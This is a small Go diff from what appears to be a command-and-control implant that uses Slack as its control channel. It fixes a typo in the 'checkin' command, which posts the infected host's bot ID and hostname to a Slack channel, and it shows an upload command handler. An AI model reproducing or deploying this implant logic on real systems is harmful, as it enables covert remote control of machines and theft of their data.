@@ -61,7 +61,7 @@ func handleMessageEvent(api *slack.Client, ev *slack.MessageEvent, rtm *slack.RT
 		command := strings.Split(strings.TrimSpace(strings.TrimPrefix(ev.Text, common.AllC2Configs.UUID.HostID)), " ")
 		common.AllC2Configs.Debug.LogDebug("Slack RTM - Command: " + command[0] + "\n")
 		switch {
-		case strings.Contains(command[0], "chekin"):
+		case strings.Contains(command[0], "checkin"):
 			rtm.SendMessage(rtm.NewOutgoingMessage("Bot: "+common.AllC2Configs.UUID.HostID+" Hostname: "+common.AllC2Configs.UUID.HostName+"\n", ev.Channel))
 
 		case strings.Contains(command[0], common.AllC2Configs.Slack.Upload):
